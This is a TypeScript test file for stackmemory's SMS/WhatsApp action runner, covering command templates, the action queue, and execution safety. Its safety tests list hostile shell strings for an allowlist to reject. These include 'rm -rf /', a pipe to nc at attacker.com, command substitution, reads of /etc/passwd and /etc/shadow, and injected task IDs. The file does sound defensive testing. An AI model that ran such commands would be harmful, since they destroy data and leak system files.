/**
 * Integration Tests: SMS/WhatsApp Action Processing
 * Tests the action queue, execution safety, and response processing
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { join } from 'path';
import { homedir } from 'os';
import { existsSync, readFileSync, writeFileSync, mkdirSync } from 'fs';

import {
  loadActionQueue,
  saveActionQueue,
  executeActionSafe,
  queueAction,
  cleanupOldActions,
  ACTION_TEMPLATES,
  type ActionQueue,
} from '../sms-action-runner.js';
import { type SMSConfig } from '../sms-notify.js';

describe('SMS Action Processing', () => {
  const configDir = join(homedir(), '.stackmemory');
  const configPath = join(configDir, 'sms-notify.json');
  const queuePath = join(configDir, 'sms-action-queue.json');
  let originalConfig: string | null = null;
  let originalQueue: string | null = null;
  const originalEnv: Record<string, string | undefined> = {};

  beforeEach(() => {
    // Save original files
    if (existsSync(configPath)) {
      originalConfig = readFileSync(configPath, 'utf8');
    }
    if (existsSync(queuePath)) {
      originalQueue = readFileSync(queuePath, 'utf8');
    }

    // Create directory
    mkdirSync(configDir, { recursive: true });

    // Save and clear env vars
    const envVars = [
      'TWILIO_ACCOUNT_SID',
      'TWILIO_AUTH_TOKEN',
      'TWILIO_WHATSAPP_FROM',
      'TWILIO_WHATSAPP_TO',
      'LINEAR_API_KEY',
    ];
    for (const v of envVars) {
      originalEnv[v] = process.env[v];
      delete process.env[v];
    }

    // Initialize clean config
    const cleanConfig: SMSConfig = {
      enabled: true,
      channel: 'whatsapp',
      notifyOn: {
        taskComplete: true,
        reviewReady: true,
        error: true,
        custom: true,
        contextSync: true,
      },
      responseTimeout: 300,
      pendingPrompts: [],
    };
    writeFileSync(configPath, JSON.stringify(cleanConfig));

    // Initialize clean queue
    const cleanQueue: ActionQueue = {
      actions: [],
      lastChecked: new Date().toISOString(),
    };
    writeFileSync(queuePath, JSON.stringify(cleanQueue));
  });

  afterEach(() => {
    // Restore files
    if (originalConfig) {
      writeFileSync(configPath, originalConfig);
    }
    if (originalQueue) {
      writeFileSync(queuePath, originalQueue);
    }
    originalConfig = null;
    originalQueue = null;

    // Restore env vars
    for (const [k, v] of Object.entries(originalEnv)) {
      if (v !== undefined) {
        process.env[k] = v;
      } else {
        delete process.env[k];
      }
    }
  });

  describe('Action Templates', () => {
    it('should generate valid PR approval command', () => {
      const cmd = ACTION_TEMPLATES.approvePR('123');
      expect(cmd).toBe('gh pr review 123 --approve');
    });

    it('should reject non-numeric PR numbers', () => {
      expect(() => ACTION_TEMPLATES.approvePR('abc')).toThrow(
        'Invalid PR number'
      );
      expect(() => ACTION_TEMPLATES.approvePR('123abc')).toThrow(
        'Invalid PR number'
      );
      expect(() => ACTION_TEMPLATES.approvePR('')).toThrow('Invalid PR number');
    });

    it('should generate valid merge command', () => {
      const cmd = ACTION_TEMPLATES.mergePR('456');
      expect(cmd).toBe('gh pr merge 456 --squash');
    });

    it('should generate status check command', () => {
      const cmd = ACTION_TEMPLATES.status();
      expect(cmd).toBe('stackmemory status');
    });

    it('should generate rebuild command', () => {
      const cmd = ACTION_TEMPLATES.rebuild();
      expect(cmd).toBe('npm run build');
    });

    it('should generate view PR command', () => {
      const cmd = ACTION_TEMPLATES.viewPR('789');
      expect(cmd).toBe('gh pr view 789');
    });
  });

  describe('Action Queue Management', () => {
    it('should queue and retrieve actions', () => {
      const actionId = queueAction('prompt-1', 'yes', 'npm run build');

      expect(actionId).toBeDefined();
      expect(actionId.length).toBe(16); // 8 bytes = 16 hex chars

      const queue = loadActionQueue();
      const action = queue.actions.find((a) => a.id === actionId);

      expect(action).toBeDefined();
      expect(action?.promptId).toBe('prompt-1');
      expect(action?.response).toBe('yes');
      expect(action?.action).toBe('npm run build');
      expect(action?.status).toBe('pending');
    });

    it('should generate cryptographically secure IDs', () => {
      const ids = new Set<string>();

      for (let i = 0; i < 100; i++) {
        const id = queueAction(`prompt-${i}`, 'yes', 'echo test');
        expect(ids.has(id)).toBe(false);
        ids.add(id);
      }

      expect(ids.size).toBe(100);
    });

    it('should track action status changes', () => {
      const actionId = queueAction('prompt-2', 'approve', 'npm test');

      // Initially pending
      let queue = loadActionQueue();
      expect(queue.actions.find((a) => a.id === actionId)?.status).toBe(
        'pending'
      );

      // Manually update to simulate execution
      queue = loadActionQueue();
      const action = queue.actions.find((a) => a.id === actionId);
      if (action) {
        action.status = 'running';
        saveActionQueue(queue);
      }

      queue = loadActionQueue();
      expect(queue.actions.find((a) => a.id === actionId)?.status).toBe(
        'running'
      );
    });

    it('should cleanup old completed actions', () => {
      // Queue 60 actions and mark them completed
      for (let i = 0; i < 60; i++) {
        queueAction(`prompt-${i}`, 'yes', 'echo test');
      }

      let queue = loadActionQueue();
      queue.actions.forEach((a) => {
        a.status = 'completed';
      });
      saveActionQueue(queue);

      // Cleanup should remove excess
      const removed = cleanupOldActions();
      expect(removed).toBe(10); // 60 - 50 = 10 removed

      queue = loadActionQueue();
      const completed = queue.actions.filter((a) => a.status === 'completed');
      expect(completed.length).toBe(50);
    });

    it('should not cleanup pending actions', () => {
      // Queue 60 actions, leave as pending
      for (let i = 0; i < 60; i++) {
        queueAction(`prompt-${i}`, 'yes', 'echo test');
      }

      // Cleanup should not remove pending
      const removed = cleanupOldActions();
      expect(removed).toBe(0);

      const queue = loadActionQueue();
      expect(queue.actions.length).toBe(60);
    });
  });

  describe('Action Execution Safety', () => {
    it('should block non-whitelisted commands', async () => {
      const result = await executeActionSafe('rm -rf /', 'yes');

      expect(result.success).toBe(false);
      expect(result.error).toContain('Action not allowed');
    });

    it('should block shell injection attempts', async () => {
      const maliciousCommands = [
        'npm run build; rm -rf /',
        'npm run build && cat /etc/passwd',
        'npm run build | nc attacker.com 1234',
        'npm run build `whoami`',
        'npm run build $(whoami)',
        'echo "test"; rm -rf /',
        'git status && rm -rf *',
      ];

      for (const cmd of maliciousCommands) {
        const result = await executeActionSafe(cmd, 'yes');
        expect(result.success).toBe(false);
        expect(result.error).toContain('Action not allowed');
      }
    });

    it('should block path traversal attempts', async () => {
      const traversalCommands = [
        'cat ../../../etc/passwd',
        'ls ../../..',
        'head -1 /etc/shadow',
      ];

      for (const cmd of traversalCommands) {
        const result = await executeActionSafe(cmd, 'yes');
        expect(result.success).toBe(false);
        expect(result.error).toContain('Action not allowed');
      }
    });

    it('should validate Linear task ID format', async () => {
      const invalidIds = [
        'not-a-uuid',
        '123',
        'DROP TABLE users;',
        '../../../etc/passwd',
        '"; rm -rf /',
      ];

      for (const badId of invalidIds) {
        const result = await executeActionSafe(
          `stackmemory task start ${badId}`,
          'yes'
        );
        expect(result.success).toBe(false);
      }
    });

    // Note: Tests that execute real commands (git, npm, stackmemory) are skipped
    // because they require those binaries to be available and may timeout.
    // The allowlist pattern matching is implicitly tested by the blocking tests above.
  });

  // Note: SMS Response Processing and Config Management tests are covered in sms-notify.test.ts
  // This file focuses on action queue and execution safety (unique functionality)
});
